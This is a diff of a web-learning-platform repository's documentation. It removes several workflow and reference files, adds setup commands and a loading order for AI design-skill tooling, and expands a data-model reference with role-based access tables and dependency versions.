-59: 
-60: ```
-61: Page (Server Component)
-62: ↓
-63: Layout Component
-64: ↓
-65: Feature Component
-66: ↓
-67: Shared Component
-68: ↓
-69: UI Primitive (shadcn/ui)
-70: ```
-71: 
-72: ---
-73: 
-74: # Documentation Rules
-75: 
-76: Every significant change should update the relevant documentation.
-77: 
-78: Architecture decisions should be documented before implementation whenever possible.
-79: 
-80: Documentation should always reflect the current state of the project.
-`````
-
-## File: docs/flows/Full Stack Build Flow.md
-`````markdown
- 1: # Full Stack Build Flow
- 2: 
- 3: Workflow for building full-stack features with React 19, Server Actions, and Prisma.
- 4: 
- 5: ---
- 6: 
- 7: # Steps
- 8: 
- 9: ## 1. Define the Feature
-10: 
-11: - What does the user need?
-12: - What data is required?
-13: - What interactions are needed?
+11: ```bash
+12: npx skills add https://github.com/Leonxlnx/taste-skill --skill "design-taste-frontend"
+13: ```
 14: 
-15: ## 2. Design the Data Model
+15: ## Impeccable
 16: 
-17: - Add Prisma schema changes.
-18: - Run `pnpm prisma migrate dev`.
-19: - Update `lib/db.ts` if needed.
+17: ```bash
+18: npx impeccable install
+19: ```
 20: 
-21: ## 3. Create the Repository
+21: Then in your AI coding tool:
 22: 
-23: - File: `lib/repositories/[feature].ts`.
-24: - CRUD operations only.
-25: - No business logic.
-26: - Use Prisma Client.
-27: 
-28: ## 4. Create the Service
-29: 
-30: - File: `lib/services/[feature].ts`.
-31: - Business rules and workflows.
-32: - Coordinate between repositories.
-33: - Validate with Zod.
-34: 
-35: ## 5. Create the Server Action
-36: 
-37: - File: `app/[route]/actions.ts`.
-38: - Input validation with Zod.
-39: - Authentication check.
-40: - Call service layer.
-41: - Return typed response.
-42: 
-43: ## 6. Create the UI
-44: 
-45: - Server Component by default.
-46: - Client Component only when required.
-47: - Use shadcn/ui primitives.
-48: - Apply design rules.
-49: 
-50: ## 7. Wire It Together
-51: 
-52: ```
-53: UI Component
-54: ↓
-55: Server Action
-56: ↓
-57: Service
-58: ↓
-59: Repository
-60: ↓
-61: Prisma
-62: ↓
-63: PostgreSQL (Neon)
-64: ```
-65: 
-66: ## 8. Test
-67: 
-68: - Unit tests for service logic.
-69: - Integration tests for actions.
-70: - Component tests for UI.
-71: 
-72: ## 9. Document
-73: 
-74: - Update API documentation.
-75: - Update component inventory.
-76: - Document design decisions.
-77: 
-78: ---
-79: 
-80: # Documentation Rules
-81: 
-82: Every significant change should update the relevant documentation.
-83: 
-84: Architecture decisions should be documented before implementation whenever possible.
-85: 
-86: Documentation should always reflect the current state of the project.
-`````
-
-## File: docs/flows/Redesign First-Audit (Prompt 2).md
-`````markdown
- 1: # Redesign First-Audit (Prompt 2)
- 2: 
- 3: Workflow for redesigning existing interfaces after auditing them.
- 4: 
- 5: ---
- 6: 
- 7: # Steps
- 8: 
- 9: ## 1. Audit the Existing Interface
-10: 
-11: Before changing anything, evaluate:
-12: 
-13: - Run Section 14 pre-flight on the existing page.
-14: - Identify all failed checks.
-15: - Document what works and what does not.
-16: - Check against `docs/rules/AI Tells (Forbidden Patterns).md`.
-17: 
-18: ## 2. Classify the Redesign
-19: 
-20: Choose one mode:
-21: 
-22: ### Preserve Mode
-23: 
-24: - Keep the existing structure.
-25: - Fix specific violations.
-26: - Improve micro-interactions.
-27: - Update typography and spacing.
+23: ```
+24: /impeccable init
+25: ```
+26: 
+27: ## Vercel Web Design Guidelines
 28: 
-29: ### Overhaul Mode
-30: 
-31: - Redesign from scratch.
-32: - Keep brand identity and URLs.
-33: - Set new three dials.
-34: - Apply new design direction.
-35: 
-36: ## 3. Never Change Silently
-37: 
-38: - Document every change.
-39: - Explain why each change was made.
-40: - Preserve existing URLs and routes.
-41: - Preserve brand identity unless explicitly told to change.
-42: 
-43: ## 4. Set the Three Dials
-44: 
-45: For the new direction:
-46: 
-47: - Design Variance.
-48: - Motion Intensity.
-49: - Visual Density.
-50: 
-51: ## 5. Build the Redesign
-52: 
-53: - Follow the Greenfield workflow for new elements.
-54: - Respect preserved elements.
-55: - Apply all design rules.
-56: 
-57: ## 6. Run Pre-Flight
-58: 
-59: - Complete Section 14 checklist.
-60: - Verify all checks pass.
-61: - If any check fails, revise and re-check.
-62: 
-63: ## 7. Document Changes
-64: 
-65: - Update all affected documentation.
-66: - Record the redesign decision.
-67: - Update the component inventory.
-68: 
-69: ---
-70: 
-71: # Documentation Rules
-72: 
-73: Every significant change should update the relevant documentation.
-74: 
-75: Architecture decisions should be documented before implementation whenever possible.
-76: 
-77: Documentation should always reflect the current state of the project.
+29: ```bash
+30: npx skills add vercel-labs/agent-skills --skill web-design-guidelines
+31: ```
+32: 
+33: ## UI/UX Pro Max
+34: 
+35: ```bash
+36: npm install -g ui-ux-pro-max-cli
+37: uipro init --ai cursor
+38: ```
+39: 
+40: ---
+41: 
+42: # Loading Skills
+43: 
+44: Skills are loaded in this order (tool-agnostic):
+45: 
+46: 1. **Project-level instructions** — read `AGENTS.md` at the repository root.
+47:    - If your tool does not auto-detect `AGENTS.md`, point it to the file explicitly or to a tool-specific mirror (e.g. `CLAUDE.md`, `.cursorrules`, `.github/copilot-instructions.md`). These mirrors should be kept identical to `AGENTS.md`.
+48:    - For MCP-based agents, use the filesystem MCP tool to read `AGENTS.md`.
+49: 2. `docs/rules/` (architecture and design rules).
+50: 3. `docs/skills/` (design skill references).
+51: 4. `docs/flows/` (workflows).
+52: 5. `docs/audits/` (quality checks).
+53: 
+54: ---
+55: 
+56: # Skill Conflict Resolution
+57: 
+58: When skills conflict:
+59: 
+60: 1. Project rules in `docs/rules/` take precedence.
+61: 2. Vercel guidelines for accessibility and performance.
+62: 3. Taste Skill for aesthetic direction.
+63: 4. Impeccable for anti-pattern detection.
+64: 5. MIFB for micro-interactions.
+65: 
+66: ---
+67: 
+68: # Verification
+69: 
+70: After installing skills:
+71: 
+72: 1. Run the audit pipeline.
+73: 2. Verify no new conflicts.
+74: 3. Update documentation if rules change.
 `````
 
 ## File: docs/meta/CONVENTIONS.md
@@ -23489,65 +24314,6 @@ tsconfig.json
 24: - `refactor` — Architecture, domain model, or convention changes.
 25: - `perf` — Performance-related documentation.
 26: - `test` — Testing documentation and verification suites.
-`````
-
-## File: docs/meta/Tag Taxonomy.md
-`````markdown
- 1: # Tag Taxonomy
- 2: 
- 3: Documentation tag system for categorizing and finding documentation.
- 4: 
- 5: ---
- 6: 
- 7: # Priority Tags
- 8: 
- 9: - `P1` - Priority 1: Rules and Architecture (highest importance).
-10: - `P2` - Priority 2: Workflows and Quality Audits (very high importance).
-11: - `P3` - Priority 3: Concepts and Micro-details (medium importance).
-12: - `P4` - Priority 4: References and Research (low/reference importance).
-13: 
-14: ---
-15: 
-16: # Category Tags
-17: 
-18: - `architecture` - Architecture decisions and patterns.
-19: - `design` - UI/UX design rules and guidelines.
-20: - `quality` - Code quality and testing standards.
-21: - `workflow` - Development workflows and processes.
-22: - `security` - Security rules and practices.
-23: - `performance` - Performance optimization rules.
-24: - `accessibility` - Accessibility standards and guidelines.
-25: 
-26: ---
-27: 
-28: # Technology Tags
-29: 
-30: - `nextjs` - Next.js specific rules.
-31: - `react` - React specific rules.
-32: - `typescript` - TypeScript specific rules.
-33: - `tailwind` - Tailwind CSS specific rules.
-34: - `prisma` - Prisma ORM specific rules.
-35: - `shadcn` - shadcn/ui specific rules.
-36: - `zod` - Zod validation specific rules.
-37: 
-38: ---
-39: 
-40: # Skill Tags
-41: 
-42: - `taste-skill` - Taste Skill framework rules.
-43: - `impeccable` - Impeccable toolchain rules.
-44: - `mifb` - Make Interfaces Feel Better rules.
-45: - `vercel-guidelines` - Vercel web design guidelines.
-46: - `anthropic` - Anthropic frontend design rules.
-47: 
-48: ---
-49: 
-50: # Status Tags
-51: 
-52: - `active` - Currently in use and enforced.
-53: - `draft` - Under development, not yet enforced.
-54: - `deprecated` - No longer recommended.
-55: - `reference` - For reference only, not enforced.
 `````
 
 ## File: docs/reference/Entities.md
@@ -23630,206 +24396,282 @@ tsconfig.json
  76: 
  77: ---
  78: 
- 79: # Jest
+ 79: # Better Auth
  80: 
- 81: - Version: 30.4.2
- 82: - Role: Unit testing.
- 83: - Repository: jestjs/jest.
+ 81: - Version: 1.7.3
+ 82: - Role: Authentication and session management framework.
+ 83: - Repository: better-auth/better-auth.
  84: - License: MIT.
  85: 
  86: ---
  87: 
- 88: # Biome
+ 88: # Jest
  89: 
- 90: - Version: 2.5.x
- 91: - Role: Static analysis and code formatting.
- 92: - Repository: biomejs/biome.
+ 90: - Version: 30.5.1
+ 91: - Role: Unit testing.
+ 92: - Repository: jestjs/jest.
  93: - License: MIT.
  94: 
  95: ---
  96: 
- 97: # Domain Entities
+ 97: # Biome
  98: 
- 99: ## User
-100: - Primary entity for system accounts and profiles.
-101: - Table: `user`
-102: - Core fields:
-103:   - `id`: Unique identifier (String)
-104:   - `name`: Display name (String)
-105:   - `email`: Unique email address (String)
-106:   - `emailVerified`: Email verification status (Boolean)
-107:   - `image`: Auth provider avatar image URL (String, optional)
-108: - Profile fields (Task 02):
-109:   - `headline`: Professional headline, max 100 characters (String, optional)
-110:   - `bio`: Biography summary, max 1000 characters (String, optional)
-111:   - `avatarUrl`: Custom profile avatar URL (String, optional)
-112:   - `website`: Portfolio/personal website URL (String, optional)
-113: - Timestamps: `createdAt`, `updatedAt`
-114: - Relations:
-115:   - `roles`: `UserRole[]`
-116:   - `sessions`: `Session[]`
-117:   - `accounts`: `Account[]`
-118:   - `courses`: `Course[]` (Authored courses)
-119: 
-120: ---
-121: 
-122: ## Course
-123: - Core curriculum container representing a complete educational course.
-124: - Table: `course`
-125: - Core fields:
-126:   - `id`: Unique identifier (String, cuid)
-127:   - `title`: Course title (String, 3..100 characters)
-128:   - `slug`: URL-friendly identifier, unique globally (String, auto-generated from title with collision avoidance)
-129:   - `description`: Detailed course summary (String, optional, max 1000 characters)
-130:   - `thumbnailUrl`: Cover image URL (String, optional)
-131:   - `status`: Lifecycle state (`DRAFT` | `PUBLISHED` | `ARCHIVED`, default: `DRAFT`)
-132:   - `level`: Target audience proficiency level (`BEGINNER` | `INTERMEDIATE` | `ADVANCED` | `ALL_LEVELS`, default: `ALL_LEVELS`)
-133:   - `category`: Subject taxonomy categorization (String, optional, max 50 characters)
-134:   - `instructorId`: Reference to author User account (String)
-135: - Timestamps: `createdAt`, `updatedAt`
-136: - Relations:
-137:   - `instructor`: `User` (Cascade delete)
-138:   - `modules`: `Module[]` (Ordered by `orderIndex`)
-139: - Indexes:
-140:   - `@@index([instructorId])`
-141:   - `@@index([status])`
-142:   - Unique: `slug`
-143: 
-144: ---
-145: 
-146: ## Module
-147: - Section/chapter grouping a sequence of lessons within a course.
-148: - Table: `module`
-149: - Core fields:
-150:   - `id`: Unique identifier (String, cuid)
-151:   - `title`: Section title (String, 2..100 characters)
-152:   - `description`: Module description (String, optional, max 500 characters)
-153:   - `orderIndex`: Zero-based contiguous sequential position within parent course (Int)
-154:   - `courseId`: Parent course identifier (String)
-155: - Timestamps: `createdAt`, `updatedAt`
-156: - Relations:
-157:   - `course`: `Course` (Cascade delete)
-158:   - `lessons`: `Lesson[]` (Ordered by `orderIndex`)
-159: - Constraints:
-160:   - `@@unique([courseId, orderIndex])`: Guarantees deterministic, collision-free ordering per course
-161:   - `@@index([courseId])`
-162: 
-163: ---
-164: 
-165: ## Lesson
-166: - Atomic unit of instruction within a curriculum module.
-167: - Table: `lesson`
-168: - Core fields:
-169:   - `id`: Unique identifier (String, cuid)
-170:   - `title`: Lesson title (String, 2..100 characters)
-171:   - `slug`: URL-friendly identifier within parent module (String, unique per module)
-172:   - `orderIndex`: Zero-based contiguous sequential position within parent module (Int)
-173:   - `durationMinutes`: Estimated duration (Int, optional, 1..600 minutes)
-174:   - `isFreePreview`: Whether accessible without enrollment/payment (Boolean, default: `false`)
-175:   - `moduleId`: Parent module identifier (String)
-176: - Timestamps: `createdAt`, `updatedAt`
-177: - Relations:
-178:   - `module`: `Module` (Cascade delete)
-179:   - `content`: `LessonContent?` (1-to-1, cascade delete)
-180: - Constraints:
-181:   - `@@unique([moduleId, slug])`: Enforces module-scoped slug uniqueness
-182:   - `@@unique([moduleId, orderIndex])`: Guarantees deterministic, collision-free ordering per module
-183:   - `@@index([moduleId])`
-184: 
-185: ---
-186: 
-187: ## LessonContent
-188: - Heavy educational material payload linked 1-to-1 with a Lesson.
-189: - Table: `lesson_content`
-190: - Purpose: Isolates large markdown notes, code blocks, server-sanitized HTML, video embed links, and resource attachments from lightweight curriculum navigation queries.
-191: - Core fields:
-192:   - `id`: Unique identifier (String, cuid)
-193:   - `lessonId`: Parent lesson identifier (String, unique)
-194:   - `bodyMarkdown`: Author markdown text with code snippets (String, optional, max 50,000 characters)
-195:   - `bodyHtml`: Server-compiled and sanitized HTML string (String, optional)
-196:   - `videoUrl`: Normalized video embed URL from YouTube, Vimeo, or Loom (String, optional, max 500 characters)
-197:   - `resources`: Array of resource attachments `{ name: string, url: string }` (Json, optional, max 10 attachments)
-198: - Timestamps: `createdAt`, `updatedAt`
-199: - Relations:
-200:   - `lesson`: `Lesson` (Cascade delete, 1-to-1)
-201: - Constraints:
-202:   - `@@unique([lessonId])`
-203: - Access Control:
-204:   - Mutation: Authoring instructor or admin; allowed on `DRAFT` and `PUBLISHED` courses, strictly blocked on `ARCHIVED` courses.
-205:   - Read: Public if `lesson.isFreePreview === true` AND `course.status === PUBLISHED`; otherwise restricted to authoring instructor, admin, or enrolled students (Task 05).
-206: 
-207: ---
-208: 
-209: ## Curriculum Enums
-210: 
-211: ### CourseStatus
-212: - `DRAFT`: Course under development; editable by instructor. Default state.
-213: - `PUBLISHED`: Publicly discoverable and enrollable. Requires >= 1 module and >= 1 lesson to transition. Curriculum mutations locked under draft state.
-214: - `ARCHIVED`: Deprecated course; no new enrollments.
-215: 
-216: ### CourseLevel
-217: - `BEGINNER`: Introductory material.
-218: - `INTERMEDIATE`: Requires foundational knowledge.
-219: - `ADVANCED`: Mastery-level technical topics.
-220: - `ALL_LEVELS`: Suitable for any audience. Default level.
+ 99: - Version: 2.5.12
+100: - Role: Static analysis and code formatting.
+101: - Repository: biomejs/biome.
+102: - License: MIT.
+103: 
+104: ---
+105: 
+106: # Domain Entities
+107: 
+108: ## User
+109: - Primary entity for system accounts and profiles.
+110: - Table: `user`
+111: - Core fields:
+112:   - `id`: Unique identifier (String)
+113:   - `name`: Display name (String)
+114:   - `email`: Unique email address (String)
+115:   - `emailVerified`: Email verification status (Boolean)
+116:   - `image`: Auth provider avatar image URL (String, optional)
+117: - Profile fields (Task 02):
+118:   - `headline`: Professional headline, max 100 characters (String, optional)
+119:   - `bio`: Biography summary, max 1000 characters (String, optional)
+120:   - `avatarUrl`: Custom profile avatar URL (String, optional)
+121:   - `website`: Portfolio/personal website URL (String, optional)
+122: - Timestamps: `createdAt`, `updatedAt`
+123: - Relations:
+124:   - `userRoles`: `UserRole[]`
+125:   - `sessions`: `Session[]`
+126:   - `accounts`: `Account[]`
+127:   - `authoredCourses`: `Course[]` (Authored courses)
+128:   - `enrollments`: `CourseEnrollment[]`
+129:   - `lessonProgress`: `LessonProgress[]`
+130: 
+131: ---
+132: 
+133: ## Role
+134: - Role-based access control role identifier.
+135: - Table: `role`
+136: - Core fields:
+137:   - `id`: Unique identifier (String, cuid)
+138:   - `name`: Role name (`admin`, `instructor`, `student`) (String, unique)
+139:   - `description`: Role description (String, optional)
+140: - Timestamps: `createdAt`, `updatedAt`
+141: - Relations:
+142:   - `userRoles`: `UserRole[]`
+143:   - `rolePermissions`: `RolePermission[]`
+144: 
+145: ---
+146: 
+147: ## Permission
+148: - Granular action/resource entitlement.
+149: - Table: `permission`
+150: - Core fields:
+151:   - `id`: Unique identifier (String, cuid)
+152:   - `name`: Permission name (String, unique)
+153:   - `description`: Permission description (String, optional)
+154:   - `resource`: Target resource domain (String)
+155:   - `action`: Permitted action (String)
+156: - Constraints:
+157:   - `@@unique([resource, action])`
+158: - Timestamps: `createdAt`, `updatedAt`
+159: - Relations:
+160:   - `rolePermissions`: `RolePermission[]`
+161: 
+162: ---
+163: 
+164: ## UserRole
+165: - Join table associating Users with Roles.
+166: - Table: `user_role`
+167: - Core fields:
+168:   - `id`: Unique identifier (String, cuid)
+169:   - `userId`: Reference to User (String)
+170:   - `roleId`: Reference to Role (String)
+171: - Constraints:
+172:   - `@@unique([userId, roleId])`
+173:   - `@@index([userId])`
+174:   - `@@index([roleId])`
+175: - Relations:
+176:   - `user`: `User` (Cascade delete)
+177:   - `role`: `Role` (Cascade delete)
+178: 
+179: ---
+180: 
+181: ## RolePermission
+182: - Join table mapping Roles to Permissions.
+183: - Table: `role_permission`
+184: - Core fields:
+185:   - `id`: Unique identifier (String, cuid)
+186:   - `roleId`: Reference to Role (String)
+187:   - `permissionId`: Reference to Permission (String)
+188: - Constraints:
+189:   - `@@unique([roleId, permissionId])`
+190:   - `@@index([roleId])`
+191:   - `@@index([permissionId])`
+192: - Relations:
+193:   - `role`: `Role` (Cascade delete)
+194:   - `permission`: `Permission` (Cascade delete)
+195: 
+196: ---
+197: 
+198: ## Course
+199: - Core curriculum container representing a complete educational course.
+200: - Table: `course`
+201: - Core fields:
+202:   - `id`: Unique identifier (String, cuid)
+203:   - `title`: Course title (String, 3..100 characters)
+204:   - `slug`: URL-friendly identifier, unique globally (String, auto-generated from title with collision avoidance)
+205:   - `description`: Detailed course summary (String, optional, max 1000 characters)
+206:   - `thumbnailUrl`: Cover image URL (String, optional)
+207:   - `status`: Lifecycle state (`DRAFT` | `PUBLISHED` | `ARCHIVED`, default: `DRAFT`)
+208:   - `level`: Target audience proficiency level (`BEGINNER` | `INTERMEDIATE` | `ADVANCED` | `ALL_LEVELS`, default: `ALL_LEVELS`)
+209:   - `category`: Subject taxonomy categorization (String, optional, max 50 characters)
+210:   - `instructorId`: Reference to author User account (String)
+211: - Timestamps: `createdAt`, `updatedAt`
+212: - Relations:
+213:   - `instructor`: `User` (Cascade delete)
+214:   - `modules`: `Module[]` (Ordered by `orderIndex`)
+215: - Indexes:
+216:   - `@@index([instructorId])`
+217:   - `@@index([status])`
+218:   - Unique: `slug`
+219: 
+220: ---
 221: 
-222: ### EnrollmentStatus
-223: - `ACTIVE`: Student is actively enrolled and progressing through the course.
-224: - `COMPLETED`: Student has completed all lessons (100% progress). `completedAt` timestamp is set.
-225: - `ARCHIVED`: Enrollment is archived; student can no longer track progress.
-226: 
-227: ---
-228: 
-229: ## CourseEnrollment
-230: - Tracks a student's enrollment in a course with aggregate progress metrics.
-231: - Table: `course_enrollment`
-232: - Core fields:
-233:   - `id`: Unique identifier (String, cuid)
-234:   - `userId`: Reference to enrolled student (String)
-235:   - `courseId`: Reference to enrolled course (String)
-236:   - `status`: Enrollment lifecycle state (`ACTIVE` | `COMPLETED` | `ARCHIVED`, default: `ACTIVE`)
-237:   - `progressPercentage`: Aggregate course completion percentage (Int, 0 to 100, default: 0)
-238:   - `enrolledAt`: Timestamp of initial enrollment (DateTime, auto-set)
-239:   - `completedAt`: Timestamp when 100% completion is reached (DateTime, optional, cleared on revert)
-240:   - `lastAccessedAt`: Timestamp of most recent progress activity (DateTime, auto-set)
-241: - Timestamps: `enrolledAt`, `lastAccessedAt`
-242: - Relations:
-243:   - `user`: `User` (Cascade delete)
-244:   - `course`: `Course` (Cascade delete)
-245: - Constraints:
-246:   - `@@unique([userId, courseId])`: One enrollment per student per course
-247:   - `@@index([userId])`
-248:   - `@@index([courseId])`
-249: - Access Control:
-250:   - Enroll: Any authenticated user, only in `PUBLISHED` courses.
-251:   - Read (self): Student can view their own enrollments.
-252:   - Read (course): Instructor or admin can view all enrollments for their course.
-253:   - Mutate: System-level only (progress aggregation updates).
-254: - Concurrency: Duplicate enrollment handled idempotently via `P2002` on unique constraint.
-255: 
-256: ---
-257: 
-258: ## LessonProgress
-259: - Per-user, per-lesson completion tracking. Progress is strictly user-scoped and never shared.
-260: - Table: `lesson_progress`
-261: - Core fields:
-262:   - `id`: Unique identifier (String, cuid)
-263:   - `userId`: Reference to student (String)
-264:   - `lessonId`: Reference to lesson (String)
-265:   - `isCompleted`: Whether the lesson is marked complete (Boolean, default: `false`)
-266:   - `completedAt`: Timestamp when lesson was marked complete (DateTime, optional, cleared on unmark)
-267:   - `lastAccessedAt`: Timestamp of most recent interaction (DateTime, auto-set)
-268: - Relations:
-269:   - `user`: `User` (Cascade delete)
-270:   - `lesson`: `Lesson` (Cascade delete)
-271: - Constraints:
-272:   - `@@unique([userId, lessonId])`: One progress record per student per lesson
-273:   - `@@index([userId])`
-274:   - `@@index([lessonId])`
-275: - Access Control:
-276:   - Read/Mutate: Student self only (`session.userId === progress.userId`).
-277:   - Requires active enrollment in the parent course.
-278: - Critical Invariant: Progress is NEVER stored as a global flag on the `Lesson` entity. It exists only in the `LessonProgress` join table scoped to `(userId, lessonId)`.
+222: ## Module
+223: - Section/chapter grouping a sequence of lessons within a course.
+224: - Table: `module`
+225: - Core fields:
+226:   - `id`: Unique identifier (String, cuid)
+227:   - `title`: Section title (String, 2..100 characters)
+228:   - `description`: Module description (String, optional, max 500 characters)
+229:   - `orderIndex`: Zero-based contiguous sequential position within parent course (Int)
+230:   - `courseId`: Parent course identifier (String)
+231: - Timestamps: `createdAt`, `updatedAt`
+232: - Relations:
+233:   - `course`: `Course` (Cascade delete)
+234:   - `lessons`: `Lesson[]` (Ordered by `orderIndex`)
+235: - Constraints:
+236:   - `@@unique([courseId, orderIndex])`: Guarantees deterministic, collision-free ordering per course
+237:   - `@@index([courseId])`
+238: 
+239: ---
+240: 
+241: ## Lesson
+242: - Atomic unit of instruction within a curriculum module.
+243: - Table: `lesson`
+244: - Core fields:
+245:   - `id`: Unique identifier (String, cuid)
+246:   - `title`: Lesson title (String, 2..100 characters)
+247:   - `slug`: URL-friendly identifier within parent module (String, unique per module)
+248:   - `orderIndex`: Zero-based contiguous sequential position within parent module (Int)
+249:   - `durationMinutes`: Estimated duration (Int, optional, 1..600 minutes)
+250:   - `isFreePreview`: Whether accessible without enrollment/payment (Boolean, default: `false`)
+251:   - `moduleId`: Parent module identifier (String)
+252: - Timestamps: `createdAt`, `updatedAt`
+253: - Relations:
+254:   - `module`: `Module` (Cascade delete)
+255:   - `content`: `LessonContent?` (1-to-1, cascade delete)
+256: - Constraints:
+257:   - `@@unique([moduleId, slug])`: Enforces module-scoped slug uniqueness
+258:   - `@@unique([moduleId, orderIndex])`: Guarantees deterministic, collision-free ordering per module
+259:   - `@@index([moduleId])`
+260: 
+261: ---
+262: 
+263: ## LessonContent
+264: - Heavy educational material payload linked 1-to-1 with a Lesson.
+265: - Table: `lesson_content`
+266: - Purpose: Isolates large markdown notes, code blocks, server-sanitized HTML, video embed links, and resource attachments from lightweight curriculum navigation queries.
+267: - Core fields:
+268:   - `id`: Unique identifier (String, cuid)
+269:   - `lessonId`: Parent lesson identifier (String, unique)
+270:   - `bodyMarkdown`: Author markdown text with code snippets (String, optional, max 50,000 characters)
+271:   - `bodyHtml`: Server-compiled and sanitized HTML string (String, optional)
+272:   - `videoUrl`: Normalized video embed URL from YouTube, Vimeo, or Loom (String, optional, max 500 characters)
+273:   - `resources`: Array of resource attachments `{ name: string, url: string }` (Json, optional, max 10 attachments)
+274: - Timestamps: `createdAt`, `updatedAt`
+275: - Relations:
+276:   - `lesson`: `Lesson` (Cascade delete, 1-to-1)
+277: - Constraints:
+278:   - `@@unique([lessonId])`
+279: - Access Control:
+280:   - Mutation: Authoring instructor or admin; allowed on `DRAFT` and `PUBLISHED` courses, strictly blocked on `ARCHIVED` courses.
+281:   - Read: Public if `lesson.isFreePreview === true` AND `course.status === PUBLISHED`; otherwise restricted to authoring instructor, admin, or enrolled students (Task 05).
+282: 
+283: ---
+284: 
+285: ## Curriculum Enums
+286: 
+287: ### CourseStatus
+288: - `DRAFT`: Course under development; editable by instructor. Default state.
+289: - `PUBLISHED`: Publicly discoverable and enrollable. Requires >= 1 module and >= 1 lesson to transition. Curriculum mutations locked under draft state.
+290: - `ARCHIVED`: Deprecated course; no new enrollments.
+291: 
+292: ### CourseLevel
+293: - `BEGINNER`: Introductory material.
+294: - `INTERMEDIATE`: Requires foundational knowledge.
+295: - `ADVANCED`: Mastery-level technical topics.
+296: - `ALL_LEVELS`: Suitable for any audience. Default level.
+297: 
+298: ### EnrollmentStatus
+299: - `ACTIVE`: Student is actively enrolled and progressing through the course.
+300: - `COMPLETED`: Student has completed all lessons (100% progress). `completedAt` timestamp is set.
+301: - `ARCHIVED`: Enrollment is archived; student can no longer track progress.
+302: 
+303: ---
+304: 
+305: ## CourseEnrollment
+306: - Tracks a student's enrollment in a course with aggregate progress metrics.
+307: - Table: `course_enrollment`
+308: - Core fields:
+309:   - `id`: Unique identifier (String, cuid)
+310:   - `userId`: Reference to enrolled student (String)
+311:   - `courseId`: Reference to enrolled course (String)
+312:   - `status`: Enrollment lifecycle state (`ACTIVE` | `COMPLETED` | `ARCHIVED`, default: `ACTIVE`)
+313:   - `progressPercentage`: Aggregate course completion percentage (Int, 0 to 100, default: 0)
+314:   - `enrolledAt`: Timestamp of initial enrollment (DateTime, auto-set)
+315:   - `completedAt`: Timestamp when 100% completion is reached (DateTime, optional, cleared on revert)
+316:   - `lastAccessedAt`: Timestamp of most recent progress activity (DateTime, auto-set)
+317: - Timestamps: `enrolledAt`, `lastAccessedAt`
+318: - Relations:
+319:   - `user`: `User` (Cascade delete)
+320:   - `course`: `Course` (Cascade delete)
+321: - Constraints:
+322:   - `@@unique([userId, courseId])`: One enrollment per student per course
+323:   - `@@index([userId])`
+324:   - `@@index([courseId])`
+325: - Access Control:
+326:   - Enroll: Any authenticated user, only in `PUBLISHED` courses.
+327:   - Read (self): Student can view their own enrollments.
+328:   - Read (course): Instructor or admin can view all enrollments for their course.
+329:   - Mutate: System-level only (progress aggregation updates).
+330: - Concurrency: Duplicate enrollment handled idempotently via `P2002` on unique constraint.
+331: 
+332: ---
+333: 
+334: ## LessonProgress
+335: - Per-user, per-lesson completion tracking. Progress is strictly user-scoped and never shared.
+336: - Table: `lesson_progress`
+337: - Core fields:
+338:   - `id`: Unique identifier (String, cuid)
+339:   - `userId`: Reference to student (String)
+340:   - `lessonId`: Reference to lesson (String)
+341:   - `isCompleted`: Whether the lesson is marked complete (Boolean, default: `false`)
+342:   - `completedAt`: Timestamp when lesson was marked complete (DateTime, optional, cleared on unmark)
+343:   - `lastAccessedAt`: Timestamp of most recent interaction (DateTime, auto-set)
+344: - Relations:
+345:   - `user`: `User` (Cascade delete)
+346:   - `lesson`: `Lesson` (Cascade delete)
+347: - Constraints:
+348:   - `@@unique([userId, lessonId])`: One progress record per student per lesson
+349:   - `@@index([userId])`
+350:   - `@@index([lessonId])`
+351: - Access Control:
+352:   - Read/Mutate: Student self only (`session.userId === progress.userId`).
+353:   - Requires active enrollment in the parent course.
+354: - Critical Invariant: Progress is NEVER stored as a global flag on the `Lesson` entity. It exists only in the `LessonProgress` join table scoped to `(userId, lessonId)`.
 `````
 
 ## File: docs/reference/Gaps.md
@@ -23857,1127 +24699,209 @@ tsconfig.json
 21: - **Production Deployment Pipeline:** Document and configure the production release pipeline (e.g. Vercel deployment hooks and database migration deployment).
 `````
 
-## File: docs/reference/Questions.md
+## File: docs/rules/Architecture and Stack.md
 `````markdown
- 1: # Questions
+ 1: # Architecture and Stack
  2: 
- 3: Frequently asked questions about the design skill system.
+ 3: ## Layers
  4: 
- 5: ---
- 6: 
- 7: # General
+ 5: ```
+ 6: UI (Server Components) → Actions/Routes → Services → Repositories → Database (Prisma + Neon)
+ 7: ```
  8: 
- 9: ## What is the design skill system?
+ 9: ## Responsibilities
 10: 
-11: A collection of rules, workflows, and tools for building high-quality, intentional UI with AI coding agents.
-12: 
-13: ## Why not just use one skill?
-14: 
-15: Each skill covers different aspects:
-16: 
-17: - Taste Skill: Aesthetic direction.
-18: - Impeccable: Anti-pattern detection.
-19: - MIFB: Micro-interactions.
-20: - Vercel: Accessibility and performance.
-21: - Anthropic: Taste prompting baseline.
-22: 
-23: Using all six provides comprehensive coverage.
-24: 
-25: ## How do I get started?
-26: 
-27: Read `docs/meta/Start Here.md` and `docs/deliverables/Quickstart.md`.
-28: 
-29: ---
-30: 
-31: # Technical
-32: 
-33: ## What are the three dials?
-34: 
-35: Design Variance, Motion Intensity, and Visual Density. They set the aesthetic direction before building.
-36: 
-37: ## What is Section 14?
-38: 
-39: The mandatory pre-flight checklist from Taste Skill. Every box must pass before shipping.
-40: 
-41: ## What is the em-dash ban?
-42: 
-43: A rule from Taste Skill that bans em-dashes and en-dashes in visible text. Use hyphens instead.
-44: 
-45: ---
-46: 
-47: # Process
-48: 
-49: ## When do I run the pre-flight?
-50: 
-51: Before every deliverable. It is mandatory.
-52: 
-53: ## What if skills conflict?
-54: 
-55: Follow the resolution order in `docs/decisions/Enforcement Layer Overlap.md`.
-56: 
-57: ## How do I document decisions?
-58: 
-59: Create a new file in `docs/decisions/` following the existing format.
-`````
-
-## File: docs/reference/Source Ledger.md
-`````markdown
- 1: # Source Ledger
- 2: 
- 3: Evidence-gated source tracking for design rules and claims.
- 4: 
- 5: ---
- 6: 
- 7: # Schema
- 8: 
- 9: Every source entry includes:
-10: 
-11: - `id`: Unique identifier.
-12: - `title`: Source title.
-13: - `url`: Source URL.
-14: - `source_type`: primary, official, supporting, market, practitioner.
-15: - `retrieved`: Date retrieved.
-16: - `refresh_due`: Date for refresh check.
-17: - `confidence`: high, medium, low.
-18: - `claims`: Array of verified claims.
-19: 
-20: ---
-21: 
-22: # Source Types
-23: 
-24: - `official` - Vendor documentation, official sites.
-25: - `primary` - Repository source, canonical skill files.
-26: - `supporting` - Articles, reviews, blog posts.
-27: - `market` - Market snapshots, comparison articles.
